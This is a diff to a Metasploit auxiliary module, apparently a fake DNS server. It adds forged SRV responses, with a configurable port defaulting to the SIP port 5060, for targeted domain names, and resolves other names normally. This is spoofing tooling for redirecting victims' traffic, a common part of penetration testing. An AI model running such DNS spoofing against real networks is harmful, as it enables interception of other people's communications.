@@ -44,6 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 
     register_advanced_options(
       [
+        OptInt.new('SRV_PORT', [ false, "The Port field in the SRV response for the FAKE action", 5060]),
         OptBool.new('LogConsole', [ false, "Determines whether to log all request to the console", true]),
         OptBool.new('LogDatabase', [ false, "Determines whether to log all request to the database", false]),
       ], self.class)
@@ -183,18 +184,57 @@ class Metasploit3 < Msf::Auxiliary
           request.add_additional(name, 60, ar)
 
         when 'IN::SRV'
-          res = Resolv::DNS.new().getresources(Resolv::DNS::Name.create("#{name}"),Resolv::DNS::Resource::IN::SRV)
-          host = res[0].target
-          port = res[0].port.to_i
-          weight = res[0].weight.to_i
-          priority = res[0].priority.to_i
-          host_ip = Resolv::DNS.new().getaddress(host).to_s
-          srv = Resolv::DNS::Resource::IN::SRV.new(priority,weight,port,Resolv::DNS::Name.create(host))
+
+          # Identify potential domain exceptions
+          @match_target = false
+          @match_name = name.to_s
+          @domain_target_list.each do |ex|
+            escaped = Regexp.escape(ex).gsub('\*','.*?')
+            regex = Regexp.new "^#{escaped}$", Regexp::IGNORECASE
+            if ( name.to_s =~ regex )
+              print_status("Name : #{regex}")
+              @match_target = true
+              @match_name = ex
+            end
+          end
+
+          if (@match_target and not @bypass) or (not @match_target and @bypass)
+            # Prepare the FAKE response
+            answer = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
+            srv = Resolv::DNS::Resource::IN::SRV.new(5,0,datastore['SRV_PORT'],Resolv::DNS::Name.create(name))
+            request.add_answer(name, 10, srv)
+            request.add_additional(Resolv::DNS::Name.create(name), 60, answer)
+
+            if (@log_console)
+              print_status("DNS target domain found: #{@match_name}")
+              print_status("DNS target domain #{name.to_s} faked")
+            end
+          else
+            # Resolve the SRV records of the domain
+            begin
+              responses = Resolv::DNS.new().getresources(Resolv::DNS::Name.create("#{name}"),Resolv::DNS::Resource::IN::SRV)
+              responses.each {|res|
+                host = res.target
+                port = res.port.to_i
+                weight = res.weight.to_i
+                priority = res.priority.to_i
+                host_ip = Resolv::DNS.new().getaddress(host).to_s
+                srv = Resolv::DNS::Resource::IN::SRV.new(priority,weight,port,Resolv::DNS::Name.create(host))
+                request.add_answer(name, 10, srv)
+                ar = Resolv::DNS::Resource::IN::A.new(host_ip)
+                request.add_additional(Resolv::DNS::Name.create(host), 60, ar)
+              }
+            rescue ::Exception => e
+              @error_resolving = true
+              next
+            end
+            if (@log_console)
+              print_status("DNS bypass domain found: #{@match_name}")
+              print_status("SRV records listed for #{@match_name}")
+            end
+          end
           ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
-          ar = Resolv::DNS::Resource::IN::A.new(host_ip)
-          request.add_answer(name, 10, srv)
           request.add_authority(name, 60, ns)
-          request.add_additional(Resolv::DNS::Name.create(host), 60, ar)
 
         when 'IN::PTR'
           soa = Resolv::DNS::Resource::IN::SOA.new(
